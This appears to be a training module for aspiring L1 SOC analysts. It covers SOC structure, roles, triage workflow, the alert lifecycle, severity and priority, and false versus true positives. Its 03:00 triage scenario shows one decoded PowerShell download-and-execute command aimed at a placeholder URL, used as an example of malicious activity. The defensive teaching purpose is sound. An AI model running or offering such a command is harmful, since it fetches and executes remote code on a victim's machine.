# Module 0: SOC and MXDR Fundamentals

**Priority: P0 — Must know before L1 interview**

---

## 0.1 What is a SOC?

### Simple Explanation
A Security Operations Center (SOC) is a centralized unit that monitors, detects, analyzes, and responds to cybersecurity threats 24/7. It's the "mission control" for an organization's security posture.

### Technical Explanation
A SOC combines people, processes, and technology to continuously monitor and improve an organization's security posture while preventing, detecting, analyzing, and responding to cybersecurity incidents. It operates as a centralized function using SIEM, EDR, NDR, threat intelligence, and SOAR platforms to correlate telemetry across the environment.

### Why SOCs Exist
- **Continuous monitoring**: Threats don't keep business hours
- **Rapid detection**: Reduce dwell time (average 200+ days without SOC)
- **Centralized visibility**: Single pane of glass across hybrid environments
- **Compliance**: Regulatory requirements (SOX, PCI-DSS, HIPAA, GDPR)
- **Incident response coordination**: Structured response vs ad-hoc chaos

### SOC Architecture
```
┌─────────────────────────────────────────────────────────────┐
                      DATA SOURCES
  Endpoints  │  Network  │  Cloud  │  Identity  │  Applications
  (EDR)      │  (NDR)    │  (CSPM) │  (AD/Entra)│  (WAF/Email)
└──────────────────────────┬────────────────────────────────────┘
                           ▼
┌─────────────────────────────────────────────────────────────┐
                      INGESTION & NORMALIZATION
              (Syslog, API, Agents, Forwarders)
└──────────────────────────┬────────────────────────────────────┘
                           ▼
┌─────────────────────────────────────────────────────────────┐
                         SIEM / XDR PLATFORM
              Correlation │ Enrichment │ Detection
                         │  Rules     │  Analytics
                         │  ML/AI     │  Threat Intel
└──────────────────────────┬────────────────────────────────────┘
                           ▼
┌─────────────────────────────────────────────────────────────┐
                        SOC TIERED OPERATIONS
    L1 Triage ──► L2 Investigation ──► L3 Hunt/IR ──► Mgmt
└─────────────────────────────────────────────────────────────┘
```

---

## 0.2 People / Process / Technology Model

| Pillar | Components |
|--------|------------|
| **People** | L1/L2/L3 Analysts, Detection Engineers, Threat Hunters, Incident Responders, SOC Manager, Security Engineers |
| **Process** | Alert triage, escalation, incident response, shift handover, SLA management, runbooks, playbooks |
| **Technology** | SIEM, EDR/XDR, NDR, SOAR, TIP, Vulnerability Management, Asset Inventory, Case Management |

---

## 0.3 SOC Roles and Responsibilities

### L1 SOC Analyst (Tier 1) — **YOUR TARGET ROLE**
| Responsibility | Description |
|----------------|-------------|
| **Alert Triage** | First responder to alerts; enrich, correlate, classify (TP/FP/BP) |
| **Initial Investigation** | Gather context: user, host, process, network, auth, timeline |
| **Ticket Creation** | Document findings in case management (ServiceNow, Jira, TheHive) |
| **Escalation** | Escalate true positives to L2 with complete context |
| **Basic Containment** | Execute approved playbooks: block IP, isolate host, disable account |
| **Shift Handover** | Document open cases, pending actions, unresolved alerts |
| **Log Review** | Proactive log review during quiet periods |

**Key Skills**: Windows Event Logs, Sysmon, basic networking, MITRE ATT&CK mapping, ticket writing, communication

### L2 SOC Analyst (Tier 2)
- Deep-dive investigation of escalated alerts
- Malware analysis (static/dynamic)
- Memory forensics basics
- Detection rule tuning
- Threat hunting participation
- Mentor L1 analysts

### L3 SOC Analyst / Senior Analyst (Tier 3)
- Advanced threat hunting
- Incident response leadership
- Detection engineering
- Red team collaboration
- APT tracking
- Strategic security improvements

### SOC Manager
- Shift scheduling and resource allocation
- SLA/KPI tracking (MTTD, MTTR, alert volume, escalation rate)
- Stakeholder communication
- Budget and tooling decisions
- Process improvement

### Detection Engineer
- Write/maintain detection rules (Sigma, KQL, SPL, YARA)
- Reduce false positives
- Coverage mapping to MITRE ATT&CK
- Test rules against attack simulations

### Threat Hunter
- Proactive hypothesis-driven hunting
- Adversary emulation
- Threat intelligence integration
- Novel technique discovery

### Incident Responder
- Containment, eradication, recovery
- Forensic evidence preservation
- Root cause analysis
- Lessons learned documentation

### Security Engineer
- Platform administration (SIEM, EDR, SOAR)
- Integration development
- Pipeline automation
- Infrastructure as Code for security tooling

---

## 0.4 Typical L1 Workflow

```
┌────────────────────────────────────────────────────────────────┐
                        SHIFT START
├────────────────────────────────────────────────────────────────┤
  1. Shift handover review (open cases, pending escalations)
  2. Dashboard review: alert queue, system health, threat intel
  3. Prioritize queue by severity/SLA
├────────────────────────────────────────────────────────────────┤
  ALERT ARRIVES → ENRICH → TRIAGE → DECIDE
  ├─ False Positive  → Close with reason
  ├─ Benign Positive → Close with context
  ├─ True Positive   → Create case → Escalate to L2
  └─ Inconclusive    → Deepen investigation / time-box
├────────────────────────────────────────────────────────────────┤
  4. Case documentation (every action timestamped)
  5. Escalation with full context package
  6. Approved containment actions (playbook execution)
  7. Shift handover documentation
└────────────────────────────────────────────────────────────────┘
                        SHIFT END
```

---

## 0.5 SOC Operational Models

### 24/7 SOC
Single team covers all hours. Risk: analyst fatigue, coverage gaps during handover.

### Follow-the-Sun SOC
Distributed teams across time zones (e.g., US → EMEA → APAC). Continuous coverage without night shifts.
**Handover critical**: Structured handoff document, overlapping shifts.

### Hybrid / MXDR Model
- Internal L1/L2 + External MDR provider for nights/weekends/overflow
- MDR handles Tier 1 triage; internal team handles Tier 2+
- Shared case management platform

---

## 0.6 Core Concepts: Event → Alert → Incident → Case

| Term | Definition | Example |
|------|------------|---------|
| **Event** | Raw, single occurrence recorded by a source | Windows Event ID 4624 (logon) |
| **Alert** | Correlated/analyzed event exceeding threshold | "5 failed logons + 1 success in 5 min" |
| **Detection** | Logic that generates alerts (rule, ML, behavioral) | Sigma rule, Splunk correlation search |
| **Incident** | Confirmed security event requiring response | "Compromised admin account" |
| **Case** | Formal tracking record in ticketing system | INC-2024-001234 in ServiceNow |
| **Finding** | Observation from investigation | "Malware executed via macro" |
| **IOC** | Indicator of Compromise (static artifact) | Hash, IP, domain, registry key |
| **IOA** | Indicator of Attack (behavioral pattern) | "PowerShell downloading encoded script" |
| **TTP** | Tactics, Techniques, Procedures | T1059.001 PowerShell, T1003 Credential Dumping |

### Critical Distinctions

**Event ≠ Alert**: Millions of events → hundreds of alerts. Events are raw; alerts are actionable.

**Alert ≠ Incident**: Most alerts are false positives. An incident is a *confirmed* security event requiring coordinated response.

**IOC vs IOA**:
- IOC = "What happened" (reactive, static, ages quickly)
- IOA = "What is happening" (proactive, behavioral, durable)

---

## 0.7 Lifecycle: Event → Closure

```
EVENT (Raw Log)
    │
    ▼
INGESTION & NORMALIZATION (SIEM/XDR)
    │
    ▼
CORRELATION / DETECTION (Rule Match / ML / Threat Intel Hit)
    │
    ▼
ALERT GENERATED (Queue in SOC Platform)
    │
    ▼
L1 TRIAGE (Enrichment + Context Gathering)
    │
    ├─► FALSE POSITIVE → Close (Document Why)
    │
    ├─► BENIGN POSITIVE → Close (Document Context)
    │
    ├─► INCONCLUSIVE → Deepen Investigation (Time-boxed)
    │
    └─► TRUE POSITIVE → CREATE INCIDENT CASE
                            │
                            ▼
                    ESCALATION TO L2
                            │
                            ▼
                    L2 INVESTIGATION
                            │
                            ▼
                    CONTAINMENT / ERADICATION
                            │
                            ▼
                    RECOVERY
                            │
                            ▼
                    LESSONS LEARNED / CLOSURE
```

---

## 0.8 Severity, Priority, SLA, Impact, Urgency

| Concept | Definition | L1 Relevance |
|---------|------------|--------------|
| **Severity** | Technical criticality of the threat | P1=Critical (active breach), P2=High, P3=Medium, P4=Low |
| **Priority** | Business urgency for response | Combines severity + asset criticality + data sensitivity |
| **Impact** | Potential damage if true positive | Data loss, financial, reputational, operational |
| **Urgency** | Time sensitivity of response | Active ransomware = minutes; failed logins = hours |
| **SLA** | Contractual response time | P1: 15 min ack, 1 hr containment; P4: 24-48 hr |

**Key Insight**: Severity ≠ Priority. A P1-severity alert on a test server may be P3 priority. A P2-severity alert on the CEO's laptop is P1 priority.

---

## 0.9 False Positive vs True Positive vs Benign Positive

| Classification | Definition | Action |
|----------------|------------|--------|
| **True Positive (TP)** | Alert correctly identifies malicious activity | Escalate, contain, investigate |
| **False Positive (FP)** | Alert triggered but no malicious activity | Close, tune rule if recurring |
| **Benign Positive (BP)** | Alert triggered by authorized/expected activity | Close, document context (e.g., admin script, vuln scan) |
| **Inconclusive** | Insufficient evidence to classify | Extend investigation, gather more telemetry, re-evaluate |

---

## 0.10 What an L1 Analyst Actually Does at 03:00

> **Alert**: "Suspicious PowerShell Execution - Encoded Command"
> **Host**: WORKSTN-047 (Marketing Dept)
> **User**: j.smith@company.com

**Your 15-minute triage**:
1. **Pull alert details**: Rule name, timestamp, process tree, command line
2. **Enrich user**: AD groups, recent logins, MFA status, department
3. **Enrich host**: EDR status, recent alerts, installed software, criticality
4. **Analyze process tree**: `winword.exe → powershell.exe -enc ...`
5. **Check command line**: Decode Base64 → `IEX (New-Object Net.WebClient).DownloadString('http://malicious.ps1')`
6. **Check network**: Did PowerShell make outbound connections? To where? Reputation?
7. **Check file system**: Any dropped files? Hashes? Reputation?
8. **Check timeline**: What happened 30 min before/after?
9. **Threat intel**: IP/domain/hash reputation (VT, AbuseIPDB, internal TIP)
10. **Decide**: TP → Escalate with full package. FP/BP → Close with evidence.

---

## 0.11 Common L1 Mistakes

| Mistake | Consequence | Correction |
|---------|-------------|------------|
| Closing alert without enrichment | Missed breach | Always enrich: user, host, process, network, TI |
| Escalating without context | L2 wastes time gathering basics | Package: timeline, process tree, IOCs, user/host context |
| Confusing severity with priority | Wrong SLA applied | Assess asset criticality + data sensitivity |
| Not documenting "why" | No audit trail, knowledge loss | Every decision: evidence → conclusion |
| Ignoring "benign positive" patterns | Rule fatigue, missed tuning opportunities | Tag BP, feed back to detection engineering |
| Tunnel vision on single alert | Miss campaign | Check for related alerts across environment |

---

## 0.12 Study Checklist for Module 0

- [ ] Explain SOC purpose and architecture
- [ ] Differentiate L1/L2/L3/Manager/Detection Engineer/Hunter/IR roles
- [ ] Describe typical L1 shift workflow
- [ ] Compare 24/7 vs Follow-the-Sun vs MXDR models
- [ ] Define Event, Alert, Detection, Incident, Case, Finding, IOC, IOA, TTP
- [ ] Explain Event → Alert → Incident → Closure lifecycle
- [ ] Differentiate Severity, Priority, Impact, Urgency, SLA
- [ ] Classify alerts: TP, FP, BP, Inconclusive
- [ ] Walk through 03:00 triage scenario end-to-end

---

## 0.13 Key Takeaways

1. **SOC is a process, not just tools** — People and process scale; tools alone don't
2. **L1 is the filter** — Your job: separate signal from noise, package context for L2
3. **Context is everything** — An alert without enrichment is useless
4. **Documentation = professionalism** — If it's not documented, it didn't happen
5. **Escalation is not failure** — Proper escalation with context is success
6. **False positives are data** — They drive detection tuning; track patterns

---

*Next: Module 1 — MDR / XDR / MXDR Deep Dive*